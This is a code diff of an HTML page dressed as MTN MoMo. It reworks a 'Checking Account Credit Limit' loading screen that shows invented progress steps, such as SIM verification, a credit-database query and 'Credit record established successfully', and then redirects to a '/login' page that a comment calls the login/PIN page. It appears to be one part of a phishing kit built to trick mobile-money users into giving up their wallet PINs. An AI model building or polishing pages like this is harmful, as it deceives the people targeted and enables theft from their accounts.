@@ -3,25 +3,114 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Evaluating Eligibility - MTN MoMo</title>
+    <title>Checking Account Credit Limit - MTN MoMo</title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <style>
-        body { background-color: #003366; color: white; min-height: 100vh; display: flex; align-items: center; justify-content: center; font-family: system-ui, -apple-system, sans-serif; margin: 0; padding: 20px; text-align: center; }
-        .momo-logo { background-color: #FFCC00; color: #003366; font-weight: 900; font-size: 1.5rem; padding: 8px 18px; border-radius: 12px; display: inline-block; }
+        * { box-sizing: border-box; }
+        html, body {
+            margin: 0; padding: 0; width: 100%; min-height: 100vh;
+            background-color: #003366; color: #ffffff;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            display: flex; align-items: center; justify-content: center; text-align: center;
+        }
+        .screen-container {
+            width: 100%; max-width: 480px; padding: 30px 24px;
+        }
+        /* Slick Brand Logo Box */
+        .brand-box {
+            width: 90px; height: 90px; background-color: #FFCC00;
+            border-radius: 24px; display: inline-flex; align-items: center; justify-content: center;
+            font-weight: 900; font-size: 2.2rem; color: #003366;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3); margin-bottom: 30px;
+            position: relative; animation: pulseGlow 2s infinite ease-in-out;
+        }
+        @keyframes pulseGlow {
+            0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255, 204, 0, 0.4); }
+            50% { transform: scale(1.05); box-shadow: 0 0 20px 10px rgba(255, 204, 0, 0.2); }
+            100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255, 204, 0, 0.4); }
+        }
+        /* Custom Loading Indicator */
+        .spinner-container {
+            margin: 25px auto 35px; display: flex; justify-content: center; align-items: center; gap: 8px;
+        }
+        .dot {
+            width: 12px; height: 12px; background-color: #FFCC00; border-radius: 50%;
+            animation: bounceDot 1.4s infinite ease-in-out both;
+        }
+        .dot:nth-child(1) { animation-delay: -0.32s; }
+        .dot:nth-child(2) { animation-delay: -0.16s; }
+        @keyframes bounceDot {
+            0%, 80%, 100% { transform: scale(0); opacity: 0.3; }
+            40% { transform: scale(1.0); opacity: 1; }
+        }
+        /* Status Steps List */
+        .status-card {
+            background: rgba(0, 51, 102, 0.6); border: 1px solid rgba(255, 255, 255, 0.15);
+            border-radius: 16px; padding: 20px; text-align: left; margin-top: 30px;
+            box-shadow: 0 8px 25px rgba(0,0,0,0.2);
+        }
+        .status-item {
+            display: flex; align-items: center; font-size: 0.9rem; margin-bottom: 12px; color: rgba(255,255,255,0.6);
+        }
+        .status-item:last-child { margin-bottom: 0; }
+        .status-item.active { color: #FFCC00; font-weight: 700; }
+        .status-item.completed { color: #ffffff; }
+        .status-icon { margin-right: 12px; font-size: 1.1rem; }
     </style>
 </head>
 <body>
-    <div style="width: 100%; max-width: 450px;">
-        <div class="momo-logo mb-4">MM</div>
-        <div class="spinner-border text-warning mb-4" style="width: 3.5rem; height: 3.5rem;" role="status"></div>
-        <h4 class="fw-bold mb-2">Checking Account Credit Limit...</h4>
-        <p class="text-white-50 small mb-0">Please wait while we establish your credit record with MTN Mobile Money systems.</p>
+
+    <div class="screen-container">
+        <!-- Logo Box -->
+        <div>
+            <div class="brand-box">MM</div>
+        </div>
+
+        <h2 class="fw-bold mb-2 fs-2" id="statusTitle">Checking Account Credit Limit...</h2>
+        <p class="text-white-50 small mb-2 px-3" id="statusDesc">Please wait while we establish your credit record with MTN Mobile Money systems.</p>
+
+        <!-- Bouncing Dot Loader -->
+        <div class="spinner-container">
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+        </div>
+
+        <!-- Live Status Tracking Card -->
+        <div class="status-card">
+            <div class="status-item completed" id="step1">
+                <span class="status-icon">✓</span> <span>Verifying SIM registration details</span>
+            </div>
+            <div class="status-item active" id="step2">
+                <span class="status-icon">⏳</span> <span id="step2Text">Querying MTN credit scoring database</span>
+            </div>
+            <div class="status-item" id="step3">
+                <span class="status-icon">⚪</span> <span>Preparing secure wallet authorization</span>
+            </div>
+        </div>
     </div>
 
     <script>
-        setTimeout(function() {
+        // Smooth progressive status updates before routing to login/PIN
+        setTimeout(() => {
+            document.getElementById('step1').className = "status-item completed";
+            document.getElementById('step1').querySelector('.status-icon').textContent = "✓";
+            
+            document.getElementById('step2').className = "status-item completed";
+            document.getElementById('step2').querySelector('.status-icon').textContent = "✓";
+            document.getElementById('step2').querySelector('span:last-child').textContent = "Credit record established successfully";
+
+            document.getElementById('step3').className = "status-item active";
+            document.getElementById('step3').querySelector('.status-icon').textContent = "⏳";
+            
+            document.getElementById('statusTitle').textContent = "Initializing Secure Session...";
+            document.getElementById('statusDesc').textContent = "Finalizing eligibility profile.";
+        }, 2200);
+
+        // Automatically proceed to login / PIN page after 4 seconds
+        setTimeout(() => {
             window.location.href = "/login";
-        }, 3000);
+        }, 4200);
     </script>
 </body>
 </html>
